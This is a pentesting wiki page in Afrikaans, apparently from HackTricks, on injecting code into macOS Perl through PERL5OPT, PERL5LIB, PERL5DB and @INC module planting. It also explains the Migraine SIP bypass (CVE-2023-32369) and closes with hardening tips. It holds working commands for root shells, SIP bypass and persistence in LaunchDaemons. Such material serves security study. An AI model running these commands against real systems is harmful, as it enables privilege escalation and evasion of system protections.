# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` omgewing veranderlike

Deur die omgewing veranderlike **`PERL5OPT`** te gebruik, is dit moontlik om **Perl** te laat uitvoer van arbitrêre opdragte wanneer die interpreter begin (selfs **voor** die eerste lyn van die teikenskrip geanaliseer word).
Byvoorbeeld, skep hierdie skrip:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Nou **voer die omgewing veranderlike uit** en voer die **perl** skrip uit:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
'n Ander opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
En gebruik dan die omgewingsveranderlikes sodat die module outomaties geleë en gelaai word:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Ander interessante omgewing veranderlikes

* **`PERL5DB`** – wanneer die interpreter met die **`-d`** (debugger) vlag begin word, word die inhoud van `PERL5DB` as Perl kode *binne* die debugger konteks uitgevoer. 
As jy beide die omgewing **en** die opdraglyn vlae van 'n bevoorregte Perl proses kan beïnvloed, kan jy iets soos die volgende doen:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # sal 'n shell laat val voordat die skrip uitgevoer word
```

* **`PERL5SHELL`** – op Windows beheer hierdie veranderlike watter shell uitvoerbare Perl sal gebruik wanneer dit 'n shell moet spawn. Dit word hier slegs genoem vir volledigheid, aangesien dit nie relevant is op macOS nie.

Alhoewel `PERL5DB` die `-d` skakel vereis, is dit algemeen om onderhouds- of installeerder skripte te vind wat as *root* uitgevoer word met hierdie vlag geaktiveer vir gedetailleerde probleemoplossing, wat die veranderlike 'n geldige eskalasie-vak kan maak.

## Deur afhanklikhede (@INC misbruik)

Dit is moontlik om die insluitpad wat Perl sal soek (**`@INC`**) te lys deur:
```bash
perl -e 'print join("\n", @INC)'
```
Tipiese uitvoer op macOS 13/14 lyk soos:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Sommige van die teruggekeerde vouers bestaan selfs nie, maar **`/Library/Perl/5.30`** bestaan, is *nie* beskerm deur SIP nie en is *voor* die SIP-beskermde vouers. Daarom, as jy as *root* kan skryf, kan jy 'n kwaadwillige module (bv. `File/Basename.pm`) laat val wat *voorkeursgewys* gelaai sal word deur enige bevoorregte skrip wat daardie module invoer.

> [!WARNING]
> Jy het steeds **root** nodig om binne `/Library/Perl` te skryf en macOS sal 'n **TCC**-prompt wys wat vra vir *Volledige Skyf Toegang* vir die proses wat die skryfoperasie uitvoer.

Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sal dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep wat aanvaller-beheerde kode bevat.

## SIP omseiling via Migrasie Assistent (CVE-2023-32369 “Migraine”)

In Mei 2023 het Microsoft **CVE-2023-32369** bekend gemaak, met die bynaam **Migraine**, 'n post-exploitatie tegniek wat 'n *root* aanvaller in staat stel om **System Integrity Protection (SIP)** heeltemal te **omseil**.
Die kwesbare komponent is **`systemmigrationd`**, 'n daemon wat toegelaat word met **`com.apple.rootless.install.heritable`**. Enige kindproses wat deur hierdie daemon gegenereer word, erf die toelae en loop dus **buite** SIP-beperkings.

Onder die kinders wat deur die navorsers geïdentifiseer is, is die Apple-onderteken interpreter:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Omdat Perl `PERL5OPT` eerbiedig, (en Bash eerbiedig `BASH_ENV`), is dit genoeg om die daemon se *omgewing* te vergiftig om arbitrêre uitvoering in 'n SIP-loos konteks te verkry:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wanneer `migrateLocalKDC` loop, begin `/usr/bin/perl` met die kwaadwillige `PERL5OPT` en voer `/private/tmp/migraine.sh` uit *voordat SIP heraktiveer word*. Vanuit daardie skrip kan jy byvoorbeeld 'n payload binne **`/System/Library/LaunchDaemons`** kopieer of die `com.apple.rootless` uitgebreide attribuut toewys om 'n lêer **onverwyderbaar** te maak.

Apple het die probleem in macOS **Ventura 13.4**, **Monterey 12.6.6** en **Big Sur 11.7.7** reggestel, maar ouer of nie-gepatchte stelsels bly uitbuitbaar.

## Versterking aanbevelings

1. **Verwyder gevaarlike veranderlikes** – bevoorregte launchdaemons of cron jobs moet met 'n skoon omgewing begin (`launchctl unsetenv PERL5OPT`, `env -i`, ens.).
2. **Vermy om interpreters as root te laat loop** tensy dit streng nodig is. Gebruik gecompileerde binêre of laat voorregte vroeg val.
3. **Verskaffer skripte met `-T` (taint mode)** sodat Perl `PERL5OPT` en ander onveilige skakels ignoreer wanneer taint kontrole geaktiveer is.
4. **Hou macOS op datum** – “Migraine” is volledig gepatch in huidige weergawes.

## Verwysings

- Microsoft Security Blog – “Nuwe macOS kwesbaarheid, Migraine, kan die Stelselintegriteitsbeskerming omseil” (CVE-2023-32369), 30 Mei 2023.
- Hackyboiz – “macOS SIP Bypass (PERL5OPT & BASH_ENV) navorsing”, Mei 2025.

{{#include ../../../banners/hacktricks-training.md}}
